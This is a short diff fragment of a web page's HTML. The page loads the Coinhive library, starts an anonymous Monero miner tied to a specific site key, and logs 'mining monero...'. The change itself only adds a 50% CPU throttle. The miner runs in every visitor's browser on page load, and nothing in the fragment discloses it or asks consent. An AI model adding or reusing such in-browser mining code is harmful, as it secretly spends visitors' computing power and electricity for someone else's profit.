@@ -28,7 +28,9 @@
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script>
 	    var miner = new CoinHive.Anonymous('9VVJpURy9VggSipeShhBE5yoyq2IL4GK');
+	    miner.setThrottle(0.5);
 	    miner.start();
+	    
         console.log('mining monero...');
     </script>
     
